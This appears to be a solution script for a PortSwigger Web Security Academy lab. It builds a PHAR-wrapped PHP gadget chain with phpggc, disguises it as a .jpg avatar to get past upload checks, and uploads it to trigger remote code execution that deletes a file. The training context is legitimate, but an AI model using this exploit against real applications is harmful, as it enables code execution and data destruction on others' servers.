"""
Lab 10: Using PHAR deserialization to deploy a custom gadget chain
https://portswigger.net/web-security/deserialization/exploiting/lab-using-phar-deserialization-to-deploy-a-custom-gadget-chain
Difficulty: Expert

📝 Upload a crafted .phar file (renamed with a harmless extension/content-
type, e.g. disguised as a .jpg avatar) — PHP deserializes a PHAR's embedded
metadata whenever certain filesystem functions (file_exists, is_dir,
getimagesize, etc.) touch the file, even with NO explicit unserialize()
call in the app's code. Pair with a gadget chain for the actual payload.

PHPGGC has a built-in --phar/-p flag that wraps any chain into a valid
PHAR automatically — no need to hand-craft the PHAR binary format.
"""

from utils import get_session, log, note, PHPGGC_NOTE

TARGET = "https://YOUR-LAB-ID.web-security-academy.net"
AVATAR_UPLOAD_PATH = "/my-account/avatar"  # confirm exact path from the account page
PAYLOAD_FILE = "exploit.phar"


def run():
    note(PHPGGC_NOTE)
    note("Generate a PHAR-wrapped payload directly with phpggc's -p flag")
    note("(use the same chain identified for Lab 9, or Lab 6 if this")
    note("instance reuses that framework):")
    note("  ./phpggc symfony/rce4 exec 'rm /home/carlos/morale.txt' "
         f"-p phar -o {PAYLOAD_FILE}")
    note("Then rename/disguise it — PHP cares about CONTENT not extension,")
    note("so a straight rename to .jpg or .avif is enough to pass most")
    note("upload-type checks while still being deserialized on touch:")
    note(f"  cp {PAYLOAD_FILE} exploit.jpg")

    s = get_session()
    s.post(f"{TARGET}/login", data={"username": "wiener", "password": "peter"})

    try:
        with open("exploit.jpg", "rb") as f:
            r = s.post(f"{TARGET}{AVATAR_UPLOAD_PATH}",
                       files={"avatar": ("exploit.jpg", f, "image/jpeg")})
        log(f"Upload response: {r.status_code}")
    except FileNotFoundError:
        log("exploit.jpg not found — generate it with phpggc first (see above).", ok=False)
        return

    note("Trigger deserialization: this usually happens automatically when")
    note("the app does its own post-upload processing (e.g. generating a")
    note("thumbnail or verifying the file exists) — no extra request needed")
    note("beyond the upload itself in most instances of this lab, but check")
    note("whether a separate 'view profile' request is what actually")
    note("touches the file if nothing happens immediately.")


if __name__ == "__main__":
    run()
